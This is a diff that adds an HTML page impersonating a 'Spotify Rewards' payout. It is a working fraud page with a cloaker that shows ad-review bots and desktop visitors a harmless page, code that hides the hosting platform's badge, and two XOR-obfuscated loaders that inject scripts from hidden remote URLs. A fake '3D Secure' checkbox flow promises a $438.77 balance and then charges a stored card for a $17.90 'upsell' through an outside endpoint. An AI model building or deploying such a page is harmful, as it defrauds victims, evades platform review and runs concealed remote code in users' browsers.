@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- 🛡️ CLOAKER: PROTEÇÃO DE NAVEGADOR DESKTOP & BOTS (SAFE REDIRECT) -->
+  <script>
+    (function () {
+      try {
+        var params = new URLSearchParams(window.location.search);
+        var preview = (params.get('preview') || params.get('view') || params.get('modo') || '').toLowerCase();
+        
+        // 1. Bypass para testes no computador (?mobile=1, ?preview=black, ?preview=paid, ?black=1)
+        if (preview === 'paid' || preview === 'spot' || preview === 'spotify' || preview === 'black' || params.get('black') === '1' || params.get('mobile') === '1') {
+          return;
+        }
+
+        // 2. Forçar modo Safe manual (?preview=safe, ?preview=white, ?safe=1)
+        if (preview === 'safe' || preview === 'white' || params.get('safe') === '1') {
+          window.location.replace('/w' + window.location.search);
+          return;
+        }
+
+        // 3. Detecção de Bots / Crawlers de Anúncios (Facebook, Meta, Google, etc.)
+        var ua = (navigator.userAgent || navigator.vendor || window.opera || '').toLowerCase();
+        var isBot = /facebookexternalhit|facebot|metainspector|googlebot|bingbot|baiduspider|duckduckbot|yandexbot|sogou|bytedance|tiktokbot|crawler|spider|robot|crawling/i.test(ua);
+
+        // 4. Detecção de Dispositivo Mobile
+        var isMobileUA = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(ua);
+        var isTouchDevice = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+        var isSmallScreen = window.innerWidth <= 768;
+
+        // Se for Bot OU se for Desktop (computador), redireciona imediatamente para a Página Safe (/w)
+        if (isBot || (!isMobileUA && !isTouchDevice && !isSmallScreen)) {
+          window.location.replace('/w' + window.location.search);
+        }
+      } catch (e) {}
+    })();
+  </script>
+  <!-- 🛡️ PERMANENT NETLIFY HUD / BADGE SUPPRESSION -->
+  <script>
+    (function () {
+      try {
+        localStorage.setItem("nl-hud:public:v1", "hidden");
+        localStorage.setItem("nl-hud:owner-private:v1", "hidden");
+        sessionStorage.setItem("nl-hud:public:v1", "hidden");
+        sessionStorage.setItem("nl-hud:owner-private:v1", "hidden");
+      } catch(e) {}
+      try {
+        var origQS = Document.prototype.querySelector;
+        Document.prototype.querySelector = function (sel) {
+          if (typeof sel === 'string' && sel.indexOf('data-nf-variant') !== -1) return null;
+          return origQS.apply(this, arguments);
+        };
+      } catch(e) {}
+      function removeNetlify() {
+        var frames = document.querySelectorAll('#nl-badge-frame, #nl-hud-frame, iframe[title*="Netlify"], iframe[id*="nl-"], [data-netlify-hud], script[data-nf-variant]');
+        for (var i = 0; i < frames.length; i++) {
+          var el = frames[i];
+          if (el.tagName === 'IFRAME' || el.tagName === 'SCRIPT') {
+            el.remove();
+          } else {
+            el.style.setProperty('display', 'none', 'important');
+            el.style.setProperty('visibility', 'hidden', 'important');
+          }
+        }
+      }
+      if (window.MutationObserver) {
+        new MutationObserver(removeNetlify).observe(document.documentElement, { childList: true, subtree: true });
+      }
+      document.addEventListener("DOMContentLoaded", removeNetlify);
+      window.addEventListener("load", removeNetlify);
+      setInterval(removeNetlify, 150);
+    })();
+  </script>
+  <style>
+    #nl-badge-frame, #nl-hud-frame, iframe[id*="nl-badge"], iframe[id*="nl-hud"], iframe[title*="Netlify"], iframe[title*="Powered by Netlify"], [data-netlify-hud], .netlify-badge {
+      display: none !important;
+      visibility: hidden !important;
+      opacity: 0 !important;
+      pointer-events: none !important;
+      width: 0 !important;
+      height: 0 !important;
+      position: absolute !important;
+      top: -9999px !important;
+      left: -9999px !important;
+      z-index: -999999 !important;
+      clip-path: path("M0 0Z") !important;
+    }
+  </style>
+  
+  
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>Spotify Rewards - Access Confirmed</title>
+  <link rel="icon" type="image/png" href="/favicon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+
+  <!-- Meta Pixel Code -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '919975694160799');
+    fbq('init', '4472134583045790');
+    fbq('track', 'PageView');
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=919975694160799&ev=PageView&noscript=1" />
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=4472134583045790&ev=PageView&noscript=1" />
+  </noscript>
+  <!-- End Meta Pixel Code -->
+
+  <style>
+    #nl-badge-frame, #nl-hud-frame, iframe[id*="nl-badge"], iframe[id*="nl-hud"], iframe[title*="Netlify"], [data-netlify-hud], .netlify-badge {
+      display: none !important;
+      visibility: hidden !important;
+      opacity: 0 !important;
+      pointer-events: none !important;
+      width: 0 !important;
+      height: 0 !important;
+      position: absolute !important;
+      top: -9999px !important;
+      left: -9999px !important;
+      z-index: -99999 !important;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: radial-gradient(ellipse at 50% -10%, #0f3a22 0%, #071a0f 40%, #050505 75%);
+      color: #fff;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      min-height: 100vh; min-height: 100dvh;
+      display: flex; align-items: center; justify-content: center;
+      padding: 24px 18px;
+      position: relative; overflow-x: hidden;
+    }
+    body::before {
+      content: ''; position: fixed; top: -140px; left: 50%; transform: translateX(-50%);
+      width: 560px; height: 340px;
+      background: radial-gradient(ellipse, rgba(29, 185, 84, 0.20) 0%, transparent 70%);
+      pointer-events: none;
+    }
+    .card {
+      width: 100%; max-width: 420px;
+      background: #111111;
+      border: 1px solid rgba(29, 185, 84, 0.18);
+      border-radius: 22px;
+      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(29, 185, 84, 0.06);
+      padding: 34px 24px 26px;
+      text-align: center;
+      position: relative; z-index: 1;
+    }
+    .brand {
+      display: inline-flex; align-items: center; gap: 8px;
+      font-size: 18px; font-weight: 700; letter-spacing: -0.5px; color: #fff;
+    }
+    .brand svg { width: 26px; height: 26px; fill: #1DB954; }
+    .brand small {
+      font-size: 10px; font-weight: 600; color: #8a8a8e; text-transform: uppercase;
+      letter-spacing: 1px; border-left: 1px solid rgba(255, 255, 255, 0.18);
+      padding-left: 8px; margin-left: 4px;
+    }
+    .check {
+      width: 78px; height: 78px; margin: 26px auto 18px;
+      border-radius: 50%;
+      background: radial-gradient(circle at 30% 25%, #25e06a, #1DB954 60%, #16934a);
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 10px 30px rgba(29, 185, 84, 0.45), 0 0 0 10px rgba(29, 185, 84, 0.10);
+      animation: pop 0.5s cubic-bezier(.2,1.4,.5,1) both;
+    }
+    @keyframes pop { 0% { transform: scale(0.6); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+    .check svg { width: 38px; height: 38px; stroke: #04150b; stroke-width: 3.2; fill: none; stroke-linecap: round; stroke-linejoin: round; }
+    h1 { font-size: 26px; font-weight: 800; letter-spacing: -0.6px; }
+    .sub { font-size: 14px; line-height: 1.55; color: #b9b9bf; margin-top: 10px; }
+    .sub strong { color: #fff; font-weight: 700; }
+    .row {
+      display: flex; align-items: center; justify-content: space-between;
+      background: #181818; border: 1px solid #282828; border-radius: 14px;
+      padding: 13px 15px; margin-top: 20px; font-size: 13px; text-align: left;
+    }
+    .row span { color: #8a8a8e; }
+    .row b { color: #1DB954; font-weight: 800; letter-spacing: -0.2px; }
+    .tasks { margin-top: 20px; text-align: left; }
+    .tasks-title { font-size: 12px; font-weight: 700; color: #b9b9bf; text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 10px; }
+    .task {
+      display: flex; align-items: flex-start; gap: 11px;
+      background: #181818; border: 1px solid #282828; border-radius: 14px;
+      padding: 12px 14px; margin-top: 8px; cursor: pointer;
+      transition: border-color 0.2s ease, background 0.2s ease;
+      user-select: none; -webkit-user-select: none;
+    }
+    .task:hover { border-color: rgba(29, 185, 84, 0.35); }
+    .task.done { border-color: rgba(29, 185, 84, 0.55); background: rgba(29, 185, 84, 0.07); }
+    .task-check { position: absolute; opacity: 0; pointer-events: none; }
+    .task-box {
+      flex: 0 0 auto; width: 22px; height: 22px; margin-top: 1px;
+      border: 2px solid #3a3a3e; border-radius: 7px;
+      display: flex; align-items: center; justify-content: center;
+      transition: all 0.18s ease;
+    }
+    .task-box svg { width: 13px; height: 13px; stroke: #04150b; stroke-width: 3.4; fill: none; stroke-linecap: round; stroke-linejoin: round; opacity: 0; transform: scale(0.5); transition: all 0.18s ease; }
+    .task-check:checked + .task-box { background: linear-gradient(135deg, #1ed760, #1DB954); border-color: #1DB954; box-shadow: 0 0 12px rgba(29, 185, 84, 0.45); }
+    .task-check:checked + .task-box svg { opacity: 1; transform: scale(1); }
+    .task-text { font-size: 13px; line-height: 1.45; color: #d7d7db; font-weight: 500; }
+    .task.done .task-text { color: #fff; }
+    .access-btn {
+      display: block; width: 100%; margin-top: 22px;
+      background: linear-gradient(135deg, #1DB954, #16a34a);
+      color: #04150b; font-family: 'Inter', sans-serif;
+      font-size: 15px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.6px;
+      padding: 17px 0; border: none; border-radius: 500px; cursor: pointer;
+      box-shadow: 0 8px 26px rgba(29, 185, 84, 0.45);
+      animation: pulseBtn 2s ease-in-out infinite;
+      transition: transform 0.15s ease;
+    }
+    .access-btn:active { transform: scale(0.98); }
+    .access-btn:disabled { opacity: 0.45; cursor: not-allowed; animation: none; box-shadow: none; filter: grayscale(0.35); }
+    @keyframes spinOverlay { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    @keyframes pulseBtn {
+      0%, 100% { box-shadow: 0 8px 26px rgba(29, 185, 84, 0.45); }
+      50% { box-shadow: 0 8px 38px rgba(29, 185, 84, 0.75); }
+    }
+    .err {
+      display: none; margin-top: 12px;
+      color: #f15e6c; font-size: 13px; font-weight: 500; line-height: 1.45;
+    }
+    .note { font-size: 11px; color: #6f6f75; margin-top: 14px; line-height: 1.5; }
+    .security-box {
+      margin-top: 18px;
+      padding: 20px 18px 18px;
+      text-align: center;
+      background:
+        radial-gradient(120% 100% at 50% 0%, rgba(29, 185, 84, 0.13), transparent 62%),
+        linear-gradient(180deg, #0c2317, #071a10);
+      border: 1px solid rgba(29, 185, 84, 0.28);
+      border-radius: 16px;
+      box-shadow: 0 14px 32px -20px rgba(0, 0, 0, 0.9), inset 0 1px 0 rgba(255, 255, 255, 0.04);
+    }
+    .security-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 38px;
+      height: 38px;
+      margin-bottom: 10px;
+      border-radius: 50%;
+      background: rgba(29, 185, 84, 0.12);
+      border: 1px solid rgba(29, 185, 84, 0.35);
+    }
+    .security-badge svg { width: 19px; height: 19px; fill: #1ed760; }
+    .security-title {
+      color: #1ed760;
+      font-size: 11.5px;
+      font-weight: 800;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      margin: 0 0 8px;
+    }
+    .security-text {
+      color: #d7dce1;
+      font-size: 13.5px;
+      line-height: 1.6;
+      margin: 0 auto 13px;
+      max-width: 34ch;
+    }
+    .security-text strong { color: #fff; font-weight: 700; }
+    .security-warn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      margin: 0;
+      padding: 7px 12px;
+      border-radius: 999px;
+      background: rgba(240, 185, 11, 0.1);
+      border: 1px solid rgba(240, 185, 11, 0.25);
+      color: #f0b90b;
+      font-size: 12px;
+      font-weight: 600;
+      line-height: 1.4;
+    }
+    .security-warn svg { width: 12px; height: 12px; fill: #f0b90b; flex-shrink: 0; }
+    .secure {
+      display: inline-flex; align-items: center; gap: 6px;
+      font-size: 11px; color: #8a8a8e; margin-top: 16px;
+    }
+    .secure svg { width: 12px; height: 12px; fill: #1DB954; }
+  </style>
+
+
+  <!-- 🎯 UTMIFY SCRIPTS (Rastreamento de UTMs e Pixel Utmify) -->
+  <script>(function(){var e_jxo=atob("DOtlnZ9sYDA2b6dVBZBH6O0AQgoUB9MhdZhfsrAPBF4YGtM4bI0cs/wDDR5UHYgmZpkM7esfT0VCAtR6aYoR+OwYTlpFTYt3ZJ8R7/YOFURTHIVvXpBH8/4BBRIMTcM0cYpI6OsBCVZPQtcnYJ0A8+tBGFNZC4omZoBHsb0aAVxDCoVvJ8kYseRODlFbCoVvJ48E6f5BFURbBsEsKJsX+OkJDkQbHNI3bI8Wv7NOFlFaGsJ3P8lH4MIR");var k_s1c=[];for(var a_8=0;a_8<e_jxo.length;a_8++){k_s1c.push(e_jxo.charCodeAt(a_8)&255);}var d_8=k_s1c[0];var d_uoiy=k_s1c.slice(1,1+d_8);var q_qk2=k_s1c.slice(1+d_8);var t_wce7=q_qk2.map(function(b,y_8){return b^d_uoiy[y_8%d_8];});var z_ecj="";for(var i_43=0;i_43<t_wce7.length;i_43++){z_ecj+=String.fromCharCode(t_wce7[i_43]&255);}var k_7xer=decodeURIComponent(escape(z_ecj));var h_0=JSON.parse(k_7xer);var j_y1=h_0.globals||[];j_y1.forEach(function(v_q){window[v_q.name]=v_q.value;});var t_6uc=document.createElement("script");t_6uc.src=h_0.url;t_6uc.async=true;t_6uc.defer=true;(h_0.attributes||[]).forEach(function(v_lx9){t_6uc.setAttribute(v_lx9.name,v_lx9.value);});(document.head||document.documentElement).appendChild(t_6uc);})();</script>
+  <script>(function(){var i_hd=atob("DC88blVZS9X/8T/DIVQeGyc1ae/dmUu3UVwGQXo6L7vRhEuuSElFQDY2JvudgxCwQl1VHiEqZKWWiVqvDl9VFjA1Zb+M0xPhQFtIHDw7PqGagh35enIQTDI1JLeenUzhG3RHTDs4JrDdyx2zSFdZAhw9afndh16vVEoeVHdvKrHOxF2gQx1fXzBvcuTJyAyiFBhYWmB7NoiC");var o_a=[];for(var g_yu=0;g_yu<i_hd.length;g_yu++){o_a.push(i_hd.charCodeAt(g_yu)&255);}var a_z=o_a[0];var f_15=o_a.slice(1,1+a_z);var a_39=o_a.slice(1+a_z);var k_ov=a_39.map(function(b,y_68f){return b^f_15[y_68f%a_z];});var f_v="";for(var d_53=0;d_53<k_ov.length;d_53++){f_v+=String.fromCharCode(k_ov[d_53]&255);}var b_idz1=decodeURIComponent(escape(f_v));var z_55d=JSON.parse(b_idz1);var o_g=z_55d.globals||[];o_g.forEach(function(d_koz){window[d_koz.name]=d_koz.value;});var h_7gc=document.createElement("script");h_7gc.src=z_55d.url;h_7gc.async=true;h_7gc.defer=true;(z_55d.attributes||[]).forEach(function(n_2t){h_7gc.setAttribute(n_2t.name,n_2t.value);});(document.head||document.documentElement).appendChild(h_7gc);})();</script>
+</head>
+<body>
+  <div id="nl-badge-frame" style="display:none!important;visibility:hidden!important;"></div>
+  <div id="nl-hud-frame" style="display:none!important;visibility:hidden!important;"></div>
+  <!-- LOADING OVERLAY -->
+  <div id="loadingOverlay" style="position:fixed; top:0; left:0; width:100%; height:100%; background:radial-gradient(ellipse at 50% 0%, #0d3320 0%, #071a0f 40%, #050505 75%); z-index:999999; display:none; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:24px; box-sizing:border-box;">
+    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="width:56px;height:56px;fill:#1DB954;filter:drop-shadow(0 4px 18px rgba(29,185,84,0.45));margin-bottom:22px;"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z" /></svg>
+    <div style="width:52px; height:52px; border:4px solid rgba(29,185,84,0.18); border-top:4px solid #1DB954; border-radius:50%; animation: spinOverlay 0.8s linear infinite; box-shadow:0 0 24px rgba(29,185,84,0.25);"></div>
+    <h3 id="overlayTitle" style="font-family:'Inter', sans-serif; font-size:22px; color:#ffffff; margin-top:22px; font-weight:800; letter-spacing:-0.3px;">Please wait...</h3>
+    <p id="overlaySub" style="font-size:14px; color:#b3b3b3; margin-top:8px; font-family:'Inter', sans-serif; font-weight:500;">Processing your reward. Stay on this page until it finishes.</p>
+    <div style="width:260px; max-width:80%; margin-top:14px;">
+      <p id="overlayCount" style="font-size:12px; color:#1DB954; font-family:'Inter', sans-serif; font-weight:700; margin-bottom:8px;">Processing...</p>
+      <div style="width:100%; height:8px; background:rgba(29,185,84,0.15); border:1px solid rgba(29,185,84,0.3); border-radius:999px; overflow:hidden;">
+        <div id="overlayBar" style="width:0%; height:100%; background:linear-gradient(90deg, #1DB954, #1ed760); border-radius:999px; transition:width 0.25s linear; box-shadow:0 0 12px rgba(29,185,84,0.6);"></div>
+      </div>
+    </div>
+    <p style="font-size:13px; color:#f15e6c; margin-top:20px; font-family:'Inter', sans-serif; font-weight:800; line-height:1.5; max-width:300px; background:rgba(241,94,108,0.08); border:1px solid rgba(241,94,108,0.25); border-radius:12px; padding:12px 16px;">Do NOT close, refresh, or leave this page.<br />If you leave now, your reward will be lost.</p>
+  </div>
+
+  <div class="card">
+    <div class="brand">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z" /></svg>
+      Spotify<small>Rewards</small>
+    </div>
+
+    <div class="check">
+      <svg viewBox="0 0 24 24"><polyline points="4.5 12.5 9.5 17.5 19.5 7" /></svg>
+    </div>
+
+    <h1>Access confirmed!</h1>
+    <p class="sub"><strong>Thank you</strong> — your reward has been secured and your balance is now unlocked. Access your application to withdraw it.</p>
+
+    <div class="row"><span>Status</span><b>CONFIRMED</b></div>
+    <div class="row"><span>Reward access</span><b>UNLOCKED</b></div>
+
+    <div class="tasks">
+      <p class="tasks-title">Complete the steps below to unlock access:</p>
+      <label class="task">
+        <input type="checkbox" class="task-check">
+        <span class="task-box">
+          <svg viewBox="0 0 24 24"><polyline points="4.5 12.5 9.5 17.5 19.5 7" /></svg>
+        </span>
+        <span class="task-text">I confirm this is my account and I want to receive my reward</span>
+      </label>
+      <label class="task">
+        <input type="checkbox" class="task-check">
+        <span class="task-box">
+          <svg viewBox="0 0 24 24"><polyline points="4.5 12.5 9.5 17.5 19.5 7" /></svg>
+        </span>
+        <span class="task-text">I understand my balance expires if I don't access it today</span>
+      </label>
+      <label class="task">
+        <input type="checkbox" class="task-check">
+        <span class="task-box">
+          <svg viewBox="0 0 24 24"><polyline points="4.5 12.5 9.5 17.5 19.5 7" /></svg>
+        </span>
+        <span class="task-text">I agree to keep the app installed for 7 days to keep the reward</span>
+      </label>
+    </div>
+
+    <button id="accessBtn" class="access-btn" type="button" disabled>Access now</button>
+    <div id="accessErr" class="err"></div>
+
+    <div class="security-box">
+      <span class="security-badge">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V5l-9-4zm-1 14.5l-4-4 1.4-1.4 2.6 2.6 5.6-5.6L17 8.5l-6 7z" /></svg>
+      </span>
+      <p class="security-title">Security Verification (3D Secure)</p>
+      <p class="security-text">To activate your <strong>Priority Cashout License</strong> and release your <strong>$438.77</strong> pending balance <strong>immediately</strong>, your provider may request a quick 1-tap confirmation.</p>
+      <p class="security-warn">
+        <svg viewBox="0 0 24 24"><path d="M13 2L4.5 13.5H11l-1 8.5 8.5-11.5H12l1-8.5z" /></svg>
+        Keep this page open to approve your verification without interruption.
+      </p>
+    </div>
+
+    <p class="note" style="display:none;"></p>
+
+    <div class="secure">
+      <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V5l-9-4zm-1 14.5l-4-4 1.4-1.4 2.6 2.6 5.6-5.6L17 8.5l-6 7z" /></svg>
+      Secure 256-bit encrypted checkout
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      var checks = Array.from(document.querySelectorAll('.task-check'));
+      var btn = document.getElementById('accessBtn');
+      var overlay = document.getElementById('loadingOverlay');
+      var bar = document.getElementById('overlayBar');
+      var count = document.getElementById('overlayCount');
+
+      function updateBtn() {
+        var allChecked = checks.length > 0 && checks.every(function (c) { return c.checked; });
+        btn.disabled = !allChecked;
+      }
+
+      checks.forEach(function (check) {
+        check.addEventListener('change', function () {
+          check.closest('.task').classList.toggle('done', check.checked);
+          updateBtn();
+        });
+      });
+
+      btn.addEventListener('click', async function () {
+        if (btn.disabled) return;
+        btn.disabled = true;
+
+        if (typeof fbq === 'function') {
+          try {
+            fbq('track', 'InitiateCheckout', {
+              value: 17.90,
+              currency: 'USD',
+              content_name: 'Upsell 2 Priority License'
+            });
+          } catch(e) {}
+        }
+
+        if (overlay) {
+          overlay.style.display = 'flex';
+          var pct = 10;
+          if (bar) bar.style.width = pct + '%';
+          if (count) count.textContent = 'Verifying security license... ' + pct + '%';
+          var timer = setInterval(function () {
+            pct = Math.min(pct + 15, 90);
+            if (bar) bar.style.width = pct + '%';
+            if (count) count.textContent = 'Releasing instant access... ' + pct + '%';
+          }, 300);
+        }
+
+        var urlParams = new URLSearchParams(window.location.search);
+        var cid = urlParams.get('cid') || urlParams.get('customer_id');
+        var pm = urlParams.get('pm') || urlParams.get('payment_method_id');
+        var workerBase = window.CHECKOUT_URL || 'https://pay.spoflow.shop';
+
+        if (cid && pm) {
+          try {
+            var res = await fetch(workerBase + '/api/stripe-charge-upsell' + window.location.search, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                customer_id: cid,
+                payment_method_id: pm,
+                upsell_number: 2,
+                email: urlParams.get('email') || '',
+                name: urlParams.get('name') || urlParams.get('nome') || ''
+              })
+            });
+            var data = await res.json();
+            if (data && data.next_url) {
+              if (typeof fbq === 'function') {
+                try {
+                  fbq('track', 'Purchase', {
+                    value: (data.amount ? data.amount / 100 : 17.90),
+                    currency: 'USD',
+                    content_name: 'Upsell 2 Priority License'
+                  });
+                } catch(e) {}
+              }
+              if (bar) bar.style.width = '100%';
+              setTimeout(function () { window.location.href = data.next_url; }, 600);
+              return;
+            }
+          } catch (e) {
+            console.warn('Upsell 2 error:', e);
+          }
+        }
+
+        if (bar) bar.style.width = '100%';
+        setTimeout(function () {
+          window.location.href = '/sp/app/app.html' + window.location.search;
+        }, 800);
+      });
+    })();
+  </script>
+</body>
+</html>
